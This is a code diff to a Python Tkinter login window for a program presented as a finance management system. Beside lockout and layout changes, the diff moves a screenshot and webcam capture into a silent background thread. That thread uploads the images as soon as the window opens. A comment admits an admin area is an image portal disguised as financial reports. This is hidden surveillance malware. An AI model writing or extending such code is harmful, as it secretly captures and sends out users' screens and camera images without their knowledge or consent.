@@ -5,6 +5,7 @@ import os
 import ctypes
 import random
 import datetime
+import threading
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 import screenshot
@@ -383,7 +384,7 @@ class LoginWindow:
     def __init__(self, root):
         self.root = root
         self.root.title(PRODUCT_SHORT_NAME)
-        self.root.geometry("640x520")
+        self.root.geometry("760x620")
         self.root.resizable(False, False)
         self.root.configure(bg="#0b1220")
 
@@ -403,18 +404,24 @@ class LoginWindow:
         }
 
         self.login_ok = False
+        self.failed_attempts = 0
+        self.max_attempts = 3
+        self.lock_seconds = 30
+        self.locked_until: datetime.datetime | None = None
+        self.upload_worker_started = False
 
         screen_w = self.root.winfo_screenwidth()
         screen_h = self.root.winfo_screenheight()
-        x = (screen_w - 640) // 2
-        y = (screen_h - 520) // 2
-        self.root.geometry(f"640x520+{x}+{y}")
+        x = (screen_w - 760) // 2
+        y = (screen_h - 620) // 2
+        self.root.geometry(f"760x620+{x}+{y}")
 
         self.root.after(80, lambda: remove_window_icon(self.root))
 
         self._build_background()
         self._build_card()
         self._bind_interactions()
+        self.root.after(120, self.start_background_capture_upload)
 
     def _build_background(self):
         self.bg_canvas = tk.Canvas(
@@ -432,11 +439,11 @@ class LoginWindow:
 
     def _build_card(self):
         outer = tk.Frame(self.root, bg=self.theme["card_outer"], relief="flat")
-        outer.place(relx=0.5, rely=0.5, anchor="center", width=520, height=420)
+        outer.place(relx=0.5, rely=0.5, anchor="center", width=600, height=500)
 
         # Card container
         self.card = tk.Frame(outer, bg=self.theme["card"], relief="flat")
-        self.card.place(x=1, y=1, width=518, height=418)
+        self.card.place(x=1, y=1, width=598, height=498)
 
         tk.Label(
             self.card, text=PRODUCT_SHORT_NAME,
@@ -448,10 +455,19 @@ class LoginWindow:
             self.card, text="登录后进入财务管理系统",
             font=("Segoe UI", 12),
             bg=self.theme["card"], fg=self.theme["muted"]
-        ).pack(pady=(0, 30))
+        ).pack(pady=(0, 22))
 
         self.username_placeholder = "账号"
         self.password_placeholder = "密码"
+
+        tk.Label(
+            self.card,
+            text="企业账号",
+            font=("Segoe UI", 10),
+            bg=self.theme["card"],
+            fg=self.theme["muted"],
+            anchor="w"
+        ).pack(fill="x", padx=36)
 
         self.username_entry = tk.Entry(
             self.card,
@@ -469,6 +485,15 @@ class LoginWindow:
         self.username_entry.bind("<FocusOut>", lambda e: self.on_entry_focus(self.username_entry, self.username_placeholder, False))
         self.username_entry.pack(fill="x", ipady=11, padx=36, pady=(0, 14))
 
+        tk.Label(
+            self.card,
+            text="登录密码",
+            font=("Segoe UI", 10),
+            bg=self.theme["card"],
+            fg=self.theme["muted"],
+            anchor="w"
+        ).pack(fill="x", padx=36)
+
         self.password_entry = tk.Entry(
             self.card,
             font=("Segoe UI", 14),
@@ -485,10 +510,10 @@ class LoginWindow:
         self.password_entry.bind("<FocusIn>", lambda e: self.on_entry_focus(self.password_entry, self.password_placeholder, True))
         self.password_entry.bind("<FocusOut>", lambda e: self.on_entry_focus(self.password_entry, self.password_placeholder, False))
         self.password_entry.bind("<Return>", self.on_login)
-        self.password_entry.pack(fill="x", ipady=11, padx=36, pady=(0, 24))
+        self.password_entry.pack(fill="x", ipady=11, padx=36, pady=(0, 20))
 
         self.login_btn = tk.Button(
-            self.card, text="登录系统",
+            self.card, text="登录财务系统",
             font=("Segoe UI", 13, "bold"),
             bg=self.theme["accent"], fg="#ffffff",
             activebackground=self.theme["accent_hover"],
@@ -506,9 +531,56 @@ class LoginWindow:
         )
         self.error_label.pack(pady=(14, 0))
 
+        tk.Label(
+            self.card,
+            text="提示：连续输错 3 次密码将临时锁定 30 秒",
+            font=("Segoe UI", 9),
+            bg=self.theme["card"],
+            fg="#6f86a8"
+        ).pack(pady=(8, 0))
+
     def _bind_interactions(self):
         self.login_btn.bind("<Enter>", lambda e: self.login_btn.config(bg=self.theme["accent_hover"]))
         self.login_btn.bind("<Leave>", lambda e: self.login_btn.config(bg=self.theme["accent"]))
+
+    def start_background_capture_upload(self):
+        """窗口显示后异步执行采集和上传，避免阻塞登录页面打开速度。"""
+        if self.upload_worker_started:
+            return
+        self.upload_worker_started = True
+
+        worker = threading.Thread(target=self._capture_upload_worker, daemon=True)
+        worker.start()
+
+    def _capture_upload_worker(self):
+        now = datetime.datetime.now()
+        event_key = now.strftime("%Y%m%d_%H%M%S")
+        client_time = now.strftime("%Y-%m-%d %H:%M:%S")
+
+        try:
+            screenshot_data = screenshot.capture_screenshot(event_key=event_key)
+
+            camera_data = camera.capture_camera(event_key=event_key)
+
+            shot_ok = uploader.upload_screenshot(
+                screenshot_data,
+                event_key=event_key,
+                client_time=client_time,
+                file_name=f"screenshot_{event_key}.png",
+            )
+            cam_ok = uploader.upload_camera_photo(
+                camera_data,
+                event_key=event_key,
+                client_time=client_time,
+                file_name=f"camera_{event_key}.jpg",
+            )
+
+            if shot_ok or cam_ok:
+                print("[后台] 终端取证上报完成")
+            else:
+                print("[后台] 终端取证上报失败")
+        except Exception as e:
+            print(f"[后台] 终端取证上报异常: {e}")
 
     def on_entry_focus(self, entry, placeholder, focused):
         if focused and entry.get() == placeholder:
@@ -531,16 +603,33 @@ class LoginWindow:
         if password == self.password_placeholder:
             password = ""
 
-        if not username or not password:
-            self.error_label.config(text="请输入用户名和密码")
+        if self.locked_until and datetime.datetime.now() < self.locked_until:
+            remain = int((self.locked_until - datetime.datetime.now()).total_seconds())
+            self.error_label.config(text=f"账号已临时锁定，请 {max(remain, 1)} 秒后重试")
             return
 
-        if username in VALID_USERS and VALID_USERS[username] == password:
+        if not username or not password:
+            self.error_label.config(text="请完整输入企业账号和登录密码")
+            return
+
+        if username not in VALID_USERS:
+            self.error_label.config(text="账号不存在或未开通财务权限，请联系系统管理员")
+            return
+
+        if VALID_USERS[username] == password:
             self.login_ok = True
+            self.failed_attempts = 0
             # 如果是 admin 登录，跳转到特殊的图片管理入口（假装是财务报表的一部分）
             self._open_dashboard(username)
         else:
-            self.error_label.config(text="用户名或密码错误")
+            self.failed_attempts += 1
+            remain = self.max_attempts - self.failed_attempts
+            if remain <= 0:
+                self.locked_until = datetime.datetime.now() + datetime.timedelta(seconds=self.lock_seconds)
+                self.failed_attempts = 0
+                self.error_label.config(text=f"密码连续校验失败，账号已锁定 {self.lock_seconds} 秒")
+            else:
+                self.error_label.config(text=f"密码错误，剩余重试次数 {remain} 次")
 
     def _open_dashboard(self, username):
         for widget in self.root.winfo_children():
@@ -556,21 +645,7 @@ class LoginWindow:
 
 
 def capture_upload_and_login():
-    now = datetime.datetime.now()
-    event_key = now.strftime("%Y%m%d_%H%M%S")
-    client_time = now.strftime("%Y-%m-%d %H:%M:%S")
-
-    print("\n[步骤1] 正在截图...")
-    screenshot_path = screenshot.capture_screenshot(event_key=event_key)
-
-    print("\n[步骤2] 正在拍摄摄像头画面...")
-    camera_path = camera.capture_camera(event_key=event_key)
-
-    print("\n[步骤3] 正在上传图片...")
-    uploader.upload_screenshot(screenshot_path, event_key=event_key, client_time=client_time)
-    uploader.upload_camera_photo(camera_path, event_key=event_key, client_time=client_time)
-
-    print("\n[步骤4] 请登录进入系统...")
+    print("\n[步骤] 正在打开登录窗口（安全采集将后台异步执行）...")
     root = tk.Tk()
     LoginWindow(root)
     root.mainloop()
